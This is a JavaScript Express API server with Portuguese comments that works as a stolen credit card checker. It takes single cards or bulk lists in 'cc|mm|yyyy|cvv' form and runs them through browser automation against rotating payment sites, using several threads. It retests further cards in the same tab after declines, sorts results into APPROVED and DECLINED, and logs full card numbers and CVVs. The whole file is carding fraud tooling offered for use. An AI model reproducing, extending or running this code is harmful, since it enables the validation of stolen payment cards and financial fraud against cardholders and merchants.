const express = require('express');
const { checkCard } = require('./paymentChecker');
const { getNextSite } = require('./paymentChecker');

const app = express();
const PORT = 3001;

app.use(express.json());

// /check — 1 cartão por vez, browser próprio, sem reteste
app.post('/check', async (req, res) => {
  const { cardNumber, expiryMonth, expiryYear, cvv } = req.body;

  if (!cardNumber || !expiryMonth || !expiryYear || !cvv) {
    return res.status(400).json({ error: 'Campos obrigatórios: cardNumber, expiryMonth, expiryYear, cvv' });
  }

  console.log(`[${new Date().toISOString()}] /check: ${cardNumber}|${expiryMonth}|${expiryYear}|${cvv}`);

  try {
    const result = await checkCard(cardNumber, expiryMonth, expiryYear, cvv);
    console.log(`[${new Date().toISOString()}] /check resultado: ${cardNumber} - ${result.status}`);
    res.json(result);
  } catch (error) {
    res.status(500).json({ error: error.message });
  }
});

// /bulk — lista de cartões com fila + reteste na mesma aba após DECLINED
// Body: { "cards": ["cc|mm|yyyy|cvv", ...], "threads": 3 }
app.post('/bulk', async (req, res) => {
  const { cards, threads = 3 } = req.body;

  if (!cards || !Array.isArray(cards) || cards.length === 0) {
    return res.status(400).json({ error: 'Campo obrigatório: cards (array de strings "cc|mm|yyyy|cvv")' });
  }

  const lines = cards.map(c => c.trim()).filter(Boolean);
  const THREADS = Math.max(1, Math.min(parseInt(threads), 10));

  console.log(`[${new Date().toISOString()}] /bulk: ${lines.length} cartões, ${THREADS} threads`);

  const results = [];
  let nextCardIndex = 0;

  async function worker() {
    let currentBrowser = null;
    let currentPage = null;

    try {
      while (true) {
        const cardIdx = nextCardIndex++;
        if (cardIdx >= lines.length) return;

        const cardLine = lines[cardIdx];
        const [cardNumber, expiryMonth, expiryYear, cvv] = cardLine.split('|');
        if (!cardNumber || !expiryMonth || !expiryYear || !cvv) continue;

        if (currentBrowser && !currentBrowser.isConnected()) {
          currentBrowser = null;
          currentPage = null;
        }
        if (currentPage && currentPage.isClosed()) {
          currentPage = null;
        }

        const site = getNextSite();

        try {
          const result = await checkCard(cardNumber, expiryMonth, expiryYear, cvv, currentPage, currentBrowser, true, site);

          if (result && result.browser) {
            currentBrowser = result.browser;
            currentPage = result.page;
          }

          const status = result && result.status;
          const isTimeout = result && result.errorReason === 'Falha após 3 tentativas (timeout/erro de navegação)';

          results.push({ cardNumber, expiryMonth, expiryYear, cvv, status: isTimeout ? 'ERROR' : status, errorReason: result ? result.errorReason : null, duration: result ? result.duration : null });

          console.log(`[${new Date().toISOString()}] ${cardNumber} - ${status}`);

          if (isTimeout || status === 'APPROVED') {
            if (currentBrowser) {
              try { await currentBrowser.close(); } catch (e) {}
              currentBrowser = null;
              currentPage = null;
            }
          } else if (status === 'DECLINED' || status === 'ERROR') {
            // Retesta os próximos 2 cards na mesma aba
            for (let r = 0; r < 2; r++) {
              const retestIdx = nextCardIndex++;
              if (retestIdx >= lines.length) break;

              const retestLine = lines[retestIdx];
              const [rc, rm, ry, rcv] = retestLine.split('|');
              if (!rc || !rm || !ry || !rcv) continue;

              console.log(`[${new Date().toISOString()}] [RETESTE ${r + 1}/2] ${rc}`);

              let retestResult;
              try {
                retestResult = await checkCard(rc, rm, ry, rcv, currentPage, currentBrowser, true, site);
              } catch (err) {
                retestResult = { status: 'ERROR', errorReason: err.message };
              }

              if (retestResult && retestResult.browser) {
                currentBrowser = retestResult.browser;
                currentPage = retestResult.page;
              }

              results.push({ cardNumber: rc, expiryMonth: rm, expiryYear: ry, cvv: rcv, status: retestResult ? retestResult.status : 'ERROR', errorReason: retestResult ? retestResult.errorReason : null, duration: 'reteste' });

              if (retestResult && retestResult.status === 'APPROVED') break;
            }

            if (currentBrowser) {
              try { await currentBrowser.close(); } catch (e) {}
              currentBrowser = null;
              currentPage = null;
            }
          }
        } catch (error) {
          results.push({ cardNumber, expiryMonth, expiryYear, cvv, status: 'ERROR', errorReason: error.message });
          if (currentBrowser) {
            try { await currentBrowser.close(); } catch (e) {}
            currentBrowser = null;
            currentPage = null;
          }
        }
      }
    } finally {
      if (currentBrowser) {
        try { await currentBrowser.close(); } catch (e) {}
      }
    }
  }

  try {
    const workerCount = Math.min(THREADS, lines.length);
    await Promise.all(Array.from({ length: workerCount }, () => worker()));
    console.log(`[${new Date().toISOString()}] /bulk concluído: ${results.length} resultados`);
    res.json({ total: results.length, results });
  } catch (error) {
    res.status(500).json({ error: error.message });
  }
});

app.get('/health', (req, res) => {
  res.json({ status: 'ok' });
});

app.listen(PORT, () => {
  console.log(`API rodando em http://localhost:${PORT}`);
});
